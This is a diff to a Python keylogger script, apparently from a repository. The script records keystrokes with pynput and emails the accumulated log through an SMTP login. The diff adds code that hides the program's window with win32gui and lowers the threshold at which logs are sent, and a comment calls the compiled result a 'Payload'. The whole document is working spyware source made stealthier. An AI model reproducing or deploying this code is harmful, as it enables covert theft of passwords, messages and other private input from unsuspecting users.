@@ -1,5 +1,11 @@
+#Required imports
 import smtplib
 from pynput.keyboard import Key, Listener
+import win32gui, win32con
+
+#Hiding the window
+hide = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(hide , win32con.SW_HIDE)
 
 #Enter these details and compile to create Payload
 email = ""
@@ -10,9 +16,9 @@ server.login(email, password)
 
 full_log = ''
 word = ''
-char_limit = 50
+char_limit = 20
 
-
+#recording keystrokes
 def on_press(key):
     global word
     global full_log
@@ -39,7 +45,7 @@ def on_press(key):
     if key == Key.esc:
         return False
 
-
+#Sending through mail
 def send_log():
     server.sendmail(
         email,
@@ -47,6 +53,6 @@ def send_log():
         full_log
     )
 
-
+#setting up listener
 with Listener(on_press=on_press) as listener:
     listener.join()
